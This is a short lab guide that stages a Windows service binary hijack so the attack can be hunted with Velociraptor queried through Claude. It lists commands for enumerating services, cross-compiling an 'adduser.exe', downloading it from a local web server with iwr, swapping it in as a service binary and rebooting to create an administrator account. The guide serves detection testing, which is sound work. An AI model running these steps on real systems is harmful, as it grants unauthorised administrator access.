# Steps to fabricate attack(safe) on Windows
This document denotes how we can fabricate a plausible attack on a Windows machine.

We demonstrate a Windows service binary hijacking(that is benign in nature).

## Step 1: Enumeration
### Open PowerShell and key in this command to look at which services are running to determine what to hijack
``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` 
#### We want to obtain a binary that is not located in C:\\WINDOWS\\sys32

## Spawning a benign service if unable to find one to hijack (for testing purposes)
``` sc.exe create InfoService binPath= "C:\Program Files\InfoService\infoservice.exe" start= auto ```
``` mkdir "C:\Program Files\InfoService" ```
``` copy "C:\Windows\System32\notepad.exe" "C:\Program Files\InfoService\infoservice.exe" ```
### Check if service is spawned (Normal case would not because it is in start=auto, only start when reboot)
``` sc qc InfoService ```

## Step 2: Create malicious binary in Kali Linux: 
### Create and compile binary: 
``` x86_64-w64-mingw32-gcc adduser.c -o adduser.exe ```
### Start web server in same directory as binary created:
``` python3 -m http.server``` 
### Download on Windows client (PowerShell):
```iwr -uri http://192.168.75.130:8000/adduser.exe -Outfile adduser.exe```
### Backup the binary by moving the original binary to a safe location
```move "C:\Program Files\InfoService\infoservice.exe" "infoservice.exe"```
```move ".\adduser.exe" "C:\Program Files\InfoService\infoservice.exe"```
```net stop infoservice ```
### Force a reboot of the system to spawn the new service
``` shutdown /r /t 0 ```
### Verify if binary was run: (Should see a new user root2)
```Get-LocalGroupMember administrators```

## Step 3: Query Velociraptor in Claude
``` Can you give me all system binaries on DESKTOP-MHTMS38 and flag services whose binary was modified recently(e.g. in the last 24 hours) ``` (works and has results by Claude)

`can you give me all network connections on DESKTOP-MHTMS38 and look for suspicious processes?`

`can you tell me which artifacts target the USN journal` 